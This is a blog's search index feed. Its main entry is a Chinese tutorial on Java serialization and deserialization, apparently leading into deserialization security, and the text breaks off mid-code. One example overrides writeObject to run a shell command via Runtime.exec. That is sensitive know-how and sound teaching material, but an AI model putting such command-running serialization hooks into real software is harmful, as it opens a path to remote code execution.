<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Test-topBanner&amp;&amp;参数释义</title>
      <link href="/2022/11/21/Test-topBanner/"/>
      <url>/2022/11/21/Test-topBanner/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="deb1bcb7f4783a6c3e9720238cf8cc98b6145a0fb1c438db1158f4300aeef5cf">2b3406d62b6174fb947463ad5f2bb2d06e57c7d91e707796abde320f4893dbc6ecbb4fc0e40fc88c7e3ac29f11bdabfbd7f7a6079a295e4f59ca91061a72c912b082bbb978746b458dabd2ae09d1b9607c30b06eb5fa6a0d770955f76b4de060247ebf9c6b70619631a88284348e2355ee58cc0995f7aba3ccedd8722f166d2189ec7f10362f3583a6b81bcfdcb4cdcbdefc043e4976fb6528a34ba3d5072c6fbe452df3c4b61ade722da2eb6fa73e3ae1b1d35c8b975ac52254704cf8dd641a8a30e703b445eea31222d1d80f0a63c4e9c6909b28efdce76765e55bc572d509e5d57cfd6ca7251233fbe757ff7cf9189a88018e0361ced56c37a6392d1979678d4f5ca089e303c08b587a543fcde7afa67f11a4bd6d001252fe1bd7fcf975c7f5599f691bd2e7b6d33ea1203b6a8a2eebcd2298eff6a2d984666f959a86431a9e6d86d94abdd8d4f86982ee87821be27d0e0b055ccc10c94061bc0e96baf0d76ae5e6483008d3c52fd7037d8e626f446087710672a3175d9cf4e33bf161479372cf772f05b4b90f93ca00d3c70240d5568e0cc66eb11e7bd8fa66f1f176b074724235671dadf855f1a8aab0b96d173cbe0578f3244805a12d1625cd1765af5b4a5a0d39fa080c4f10c2ad2299b264ca5fe6ef74db1e3605b63509cef9348f7b13e7fd744545137af7241d73eebc88d50bdae7c5e3b10fbbc8b8bb5b42a4a6af1b4081a28bdccddcde4a1d79d1c5b87bd5d265ea04ab918cee90f6172ef7e20cd155fd13c6297d78ea645dbc4818ef27ae56d8ca23e34a3d7969f734a31d842ef5d176092e099f8b1b9052826f174d10ecd9afe1f866621ace834d7aae99a9ab6a65a3eb989911be3ef771c655d8f15e4bf214d36e963500bb03f2d88b8740a1cf97b9c5826198be5fce5dbb161d70be85a8fe780730d4619dd9a92e91cd52b10f1164ce80bd132a99e07346bf7753dd4519910476bba72de8e5593cd6f3244f425cc2be03dec67c0e6f379cbfdaddbbdb3a0a034e9d28739b5ef9310ddfe4d9a8aacc53b35bef8704d0c6463825fd6952d9e55df84dc6c6e8879f39a52bb8d43bad8c0ea44182c3f5d87e75f549236feb87ce6b71b63ae95c6d295cdd0bfe69f710b61adce4991ecf4ff6dafb741986a0b51c8937282ed445375e5806b260b1174c6bdf9a318f56f53c26f30be56a918a7a23f6a9a384720c9b15ccdad9e2876cebdda68988cde24bc846b94d0f12b2aa7e9ace3a12e7ac4e9003eb11ccf599e91aa72db3596ef971c9d3eeae12681c8b0236b27e29eac67b1a438a900277e2c2e5d832098a5bd1e0d53ccc48682acffccf8a05b6cb04a032c871d00a596067d0399028ae218a3987def12909c8f03f6deea53ccf4513fffadd43a80e8f7f55956f29e131dc51c4821fbb842e1a9bba6bb4121dc986b49cfb8f5c64d97590cad29f179005ed947fa4bdb9d9fff0071e7324d3e983e64469ac6f2a0ce06a35e1b9c1606e595118081186e0dd77be1649734ecfaf6486d200c937a4f2313fef859d9a53399c796e170b15d38ac5f160270e5779326169738e560cfc7c2ba0aa5a284e0a65ba3c5a2c28032d91e7745e97b72d40d5c5eed6c254426fd668224e95c3d0a6c8efda0a778e9bee5bc2266aac2b48ea2a6572d2e48e0210c1f631ebe53fc3ce285fbdb5a821436abc58b176548cd582a68f2dc58f4b26f408102d896db46ce04f13452cdf3536b25eb7abf84557877559e26f2d8b4e7e709fa779c54302f34cb3ed622797c87997d2ad806d6f12f7745c5843c06f11af7310a0df494db326ed8b2a05d4b8218b89b32c57272d19f14b3eb00d3e8a890673d52754c7c049c9a6b81be2879a6d5a815c3b1c7e8fbc0bb3d24f1ea3d380cc521cb55a647fdf4eb6886346d97c53fd7af2df534614df57f10d37e8181bbdbea7d1849f6c79826164b8bb110d912f694eac197f0d0cbc72c0e4181f822fafd8d4a5e70532ab7723b4f6182f36f965ecace14a140e2235ccf5a35084b589afb34e53088684d7295bd0b4b5f87881a3acd9ab3346584007d83e7be04af624c4ffb970fd0e5600e4f53556139f5867312d888ee6da56183d52d5511b6c643d813a0c5865afc69e05baccce5b67da980eda1d62d460c9067ff0f4d534e598bd13b6e31965dee9669eaa911592622ea5de69740cf368b6d08cc7da4ca49d8aafc7e58b3960035c8d7b91983031046980ee1a243f652eecc025f76c4cd091bda328a2e2a26b45c231b7635e3f988003dad898272451142a76e38f4c631db116630a3c84eb9b80a82c7be65bc4d5d73c0613470757f8684dc33d326fe00ac59608f01351e3a3494743c6db962d57d5079ec881915fc03c19d70c560bc218524c823337282ede507d91b59674311d144a18493a49d709490ec76545f5c3ab6cc99411b05611ab37cfe25db4621a36655ea8164c80eaa9909ad4dc4820a1dbfbd670dbcb3ca97edfe08d038ce17c1edd582e3d298d0023b9fd58120de62fc719142fe396db0bf618b16fb096d727d8197d702181285e81a366ffb01f31dbb3a89e53e5386bd046447a6df11e06b2b9f3be166f05041292d924c1df57e1bd66833ffe10aa88ea1ec51cf91a419cce96296d9525905e1845e74ad818efe9d03e39e4efec45ff1d1e7c04c069117b80fdc49ba29bf3d561cbbe374876535e83961dc7252639d119774ce380043cf69c56461ccc66c856f7b20aebc9e29bee16d4790342443de48bec54701d04788194c0f3e4bc6c32536ffd8596e5d3619eaa76c0a55ac4fc34b82484a5b14a03364829a2c909972910f8a1c463ed9c148d8141f3e3e46f4d0d48fee31bc8682845781c66a70788ae817b7084cbb37d004774438e13542d4c9acf40c4cfe4e8d1b2e950d915119ce3391bf6fce32de053de358fbb12eae17ae51f8ef067f2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Test-swiper-index</title>
      <link href="/2022/11/21/Test-swiper-index/"/>
      <url>/2022/11/21/Test-swiper-index/</url>
      
        <content type="html"><![CDATA[<h1 id="测试swiper——index"><a href="#测试swiper——index" class="headerlink" title="测试swiper——index"></a>测试swiper——index</h1><h2 id="How-to-discover-your-authentic-self-—-at-any-age"><a href="#How-to-discover-your-authentic-self-—-at-any-age" class="headerlink" title="How to discover your authentic self — at any age"></a>How to discover your authentic self — at any age</h2><p>After more than two decades as an anchor for ABC News, an on-air panic attack sent Dan Harris’s life in a new direction: he became a dedicated meditator and, to some, even a guru. But then an anonymous survey of his family, friends and colleagues turned up some brutal feedback — he was still kind of a jerk. In a wise, funny talk, he shares his years-long quest to improve his relationships with everyone (starting with himself) and explains the science behind loving-kindness medita…</p><h2 id="How-to-break-down-barriers-and-not-accept-limits"><a href="#How-to-break-down-barriers-and-not-accept-limits" class="headerlink" title="How to break down barriers and not accept limits"></a>How to break down barriers and not accept limits</h2><ul><li>firest : I don’t know</li><li>second: You know what i’m saying? damnit!</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Butterfly主题美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>first-page</title>
      <link href="/2022/11/19/first-page/"/>
      <url>/2022/11/19/first-page/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="64d4ff5441eeeaedad0c7bdaef13cff2576367ee5c279c0893827ea455cdb755"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> test image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化编码绕过</title>
      <link href="/2022/11/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"/>
      <url>/2022/11/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7826a7d81c5f1f7804de8a95b0f2b4456e20d4f8125c9de22fc15db22964f0b8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Java security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/11/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/11/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java对象序列化指的是：将一个Java类实例序列化成字节数组，用于存储对象实例化信息：类成员变量和属性值。 </p><p>Java反序列化可指的是：将序列化后的二进制数组转换为对应的Java类实例。</p><p>Java序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成Java对象而被非常频繁的被用于<code>Socket</code>传输。</p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>在 Java 中，通过<code>java.io.Serializable(内部序列化)</code>或者<code>java.io.Externalizable(外部序列化)</code>接口即可实现序列化，其中的<code>java.io.Externalizable</code>接口只是实现了<code>java.io.Serializable</code>接口。</p><p>序列化类对象时必须满足以下条件：</p><ul><li>该类必须实现<code>java.io.Serializable</code>接口。</li><li>该类的所有属性必须是可序列化的(用transient关键字修饰的属性除外，不参与序列化过程)，如果有某个属性不可序列化，则需要注明该属性是短暂的。</li></ul><p>反序列化类对象时有如下限制：</p><ul><li>被反序列化的类必须存在。</li><li><code>serialVersionUID</code>必须一致。</li></ul><p>此外，<strong>反序列化类对象不会调用该类的构造方法</strong>。因为在反序列化创建类实例的时候使用了<code>sun.reflect.ReflectionFactory.newConstructorForSerialization</code>创建了一个反序列化专用的<code>Constructor(反射构造方法对象)</code>，这个特殊的<code>Constructor</code>可以绕过构造方法去创建类实例。</p><p>编写<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>使用反序列化创建<code>User</code>类实例<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取sun.reflect.ReflectionFactory对象</span></span><br><span class="line">            <span class="type">ReflectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line">            <span class="comment">// 使用反序列化获取User类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> factory.newConstructorForSerialization(</span><br><span class="line">                    User.class, Object.class.getConstructor()</span><br><span class="line">            );</span><br><span class="line">            System.out.println(constructor.newInstance());</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220829150934435.png" alt="image-20220829150934435"></p><h3 id="核心方法"><a href="#核心方法" class="headerlink" title="核心方法"></a>核心方法</h3><p><code>java.io.ObjectOutputStream</code>类最核心的方法是<code>writeObject</code>方法，即序列化类对象。</p><p><code>java.io.ObjectInputStream</code>类最核心的功能是<code>readObject</code>方法，即反序列化对象。</p><p>通过<code>ObjectInputStream</code>和<code>ObjectOutputStream</code>类我们就可以实现类的序列化和反序列化功能。</p><p><strong>对象序列化步骤如下：</strong></p><ol><li>创建对象输出流</li><li>通过输出流的<code>writeObject()</code>方法将对象进行序列化</li></ol><p><strong>对象反序列化步骤如下：</strong></p><ol><li>创建一个对象输入流</li><li>通过输入流的<code>readObject()</code>方法将字节序列反序列化为对象</li></ol><p><strong>代码示例：</strong></p><p>创建<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建<code>Main</code>主类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 15:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        m.serialize();</span><br><span class="line">        m.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过writeObject方法将类对象进行序列化</span></span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize success!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The name is：&quot;</span>+user.getName());</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220829154016718.png" alt="image-20220829154016718"></p><p><code>java.io.Serializable</code>是一个空的接口，实现该接口的作用是用于<strong>标识该类可序列化</strong>。实现了<code>java.io.Serializable</code>接口的类原则上都需要产生一个<code>serialVersionUID</code>常量，反序列化时如果双方的<code>serialVersionUID</code>不一致会导致<code>InvalidClassException</code>异常。如果可序列化类未显示声明<code>serialVersionUID</code>，则序列化运行时将基于该类的各个方面计算默认<code>serialVersionUID</code>值。</p><p><code>ObjectOutputStream</code>序列化类对象的主要流程是首先判断序列化的类是否重写了<code>writeObject</code>方法，如果重写了就调用序列化对象自身的<code>writeObject</code>方法序列化。<code>ObjectInputStream</code>也是同理</p><p><strong>代码示例：</strong></p><p>创建<code>User</code>类并重写<code>writeObject</code>方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 先调用默认的writeObject方法</span></span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 以下为重写命令执行内容</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byte_arr_out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取命令执行结果流</span></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b))!= -<span class="number">1</span>)&#123;</span><br><span class="line">            byte_arr_out.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打印命令执行结果</span></span><br><span class="line">        System.out.println(byte_arr_out.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建<code>main</code>主类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 15:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        m.serialize();</span><br><span class="line">        m.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过writeObject方法将类对象进行序列化</span></span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize success!&quot;</span>);</span><br><span 